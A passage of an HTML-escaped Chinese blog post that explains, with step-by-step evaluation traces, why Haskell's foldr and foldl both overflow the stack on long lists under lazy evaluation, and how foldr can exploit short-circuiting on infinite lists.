&lt;p&gt;所以，&lt;code&gt;foldr&lt;/code&gt; 能够处理无限长列表的原因在于，它从右向左折叠，展开式方向从左向右，所以&lt;strong&gt;能够利用某些表达式的短路特性&lt;/strong&gt;。&lt;/p&gt;
&lt;h1 id=&quot;二者处理长列表对比&quot;&gt;&lt;a href=&quot;#二者处理长列表对比&quot; class=&quot;headerlink&quot; title=&quot;二者处理长列表对比&quot;&gt;&lt;/a&gt;二者处理长列表对比&lt;/h1&gt;&lt;p&gt;在折叠操作无短路特性的情况下，两者处理的列表长度均有限。尽管 &lt;code&gt;foldl&lt;/code&gt; 采取了尾递归，但由于 Haskell 默认使用惰性求值，所以和 &lt;code&gt;foldr&lt;/code&gt; 一样，都会产生 &lt;code&gt;*** Exception: stack overflow&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;下面的例子来自上面的 Haskell Wiki。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;foldr&lt;/code&gt; 处理 &lt;code&gt;foldr (+) 0 [1..1000000]&lt;/code&gt; 的过程展开如下。因为 &lt;code&gt;(+)&lt;/code&gt; 是严格求值符号，所以符号两边的参数都要求出才能对表达式求值。在例子中，要求 &lt;code&gt;1 + (2 + (3 + (4 + (...))))&lt;/code&gt;，则： 1 被入栈，并对 &lt;code&gt;2 + (3 + (4 + (...)))&lt;/code&gt; 求值； 2 被入栈，并对 &lt;code&gt;3 + (4 + (...))&lt;/code&gt; 求值； 3 被入栈，并对 &lt;code&gt;4 + (...)&lt;/code&gt; 求值。当列表长度足够大时，栈满将引发栈溢出异常。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldr&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;2.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;3.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;])) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;]))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;5.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;])))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (... + (&lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt; + (foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;]))...)))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (... + (&lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; + ((foldr (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; []))))...)))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (... + (&lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))...)))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (... + (&lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;)...)))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + (... + &lt;span class=&quot;number&quot;&gt;1999999&lt;/span&gt; ...)))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;500000499990&lt;/span&gt;))) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;500000499994&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + (&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;500000499997&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;500000499999&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;500000500000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同样的表达式，用 &lt;code&gt;foldl&lt;/code&gt; 解释过程如下（使用 &lt;code&gt;foldl&lt;/code&gt; 尝试可能导致操作系统异常），因为 &lt;code&gt;(+)&lt;/code&gt; 符号产生的整个表达式仍然不可约（即不具有短路特性，必须将最后一个元素计算后才可得出结果），所以仍然要展开整个列表。整个解释过程分三部分：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一部分是尾递归，因为 Haskell 的惰性求值，&lt;code&gt;foldl f z (x:xs)&lt;/code&gt; 引出的 &lt;code&gt;foldl f (f z x) xs&lt;/code&gt; 式中，&lt;code&gt;f z x&lt;/code&gt; 不会被立刻求值，而是以 &lt;code&gt;let&lt;/code&gt; 方式在堆中分配一块空间存储，而堆的空间取决于所使用机器的内存，如果列表足够长，可能在这一部分就会导致程序的崩溃，因为这部分的工作就是向堆中写入大量 &lt;code&gt;let&lt;/code&gt; 产生的数据，这些数据会占用大量的内存。&lt;/li&gt;
&lt;li&gt;假设上一步成功执行，则堆中将充斥着 &lt;code&gt;let&lt;/code&gt; 绑定，它们的数量和列表长度相同。在下面的例子中，表达式只剩下 &lt;code&gt;z1000000&lt;/code&gt;。而要求 &lt;code&gt;z1000000&lt;/code&gt;，必须求 &lt;code&gt;z1000000 = z999999 + 1000000&lt;/code&gt; 中的 &lt;code&gt;z999999&lt;/code&gt;。所以 &lt;code&gt;1000000&lt;/code&gt; 入栈，并开始对 &lt;code&gt;z999999&lt;/code&gt; 求值；之后 &lt;code&gt;999999&lt;/code&gt; 入栈，并对 &lt;code&gt;z999998&lt;/code&gt; 求值，以此类推。这一步和 &lt;code&gt;foldr&lt;/code&gt; 的展开类似，只是列表展开方向上 &lt;code&gt;foldl&lt;/code&gt; 从右到左，当列表长度足够长时，这一步将导致栈溢出，这也是为什么 &lt;code&gt;foldl&lt;/code&gt; 对长列表做严格求值运算时，会产生 &lt;code&gt;*** Exception: stack overflow&lt;/code&gt; 异常的原因，通常堆的空间足够大，第一步能够成功执行，而在此步，&lt;code&gt;foldl&lt;/code&gt; 和 &lt;code&gt;foldr&lt;/code&gt; 面临同样的困境。&lt;/li&gt;
&lt;li&gt;假设上一步成功执行，剩下的操作就是不断地出栈、求值。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&lt;/span&gt; (+) &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; foldl (+) z1 [&lt;span class=&quot;number&quot;&gt;2.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; foldl (+) z2 [&lt;span class=&quot;number&quot;&gt;3.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; foldl (+) z3 [&lt;span class=&quot;number&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;-- ... after many foldl steps ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999997 = z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999998 = z999997 + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999999 = z999998 + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; foldl (+) z999999 [&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999997 = z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999998 = z999997 + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999999 = z999998 + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z100000 = z999999 + &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;in&lt;/span&gt; foldl (+) z1000000 [] &lt;span class=&quot;comment&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;let&lt;/span&gt; z1 =  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z2 = z1 + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z3 = z2 + &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z4 = z3 + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999997 = z999996 + &lt;span class=&quot;number&quot;&gt;999997&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999998 = z999997 + &lt;span class=&quot;number&quot;&gt;999998&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z999999 = z999998 + &lt;span class=&quot;number&quot;&gt;999999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    z100000 = z999999 + 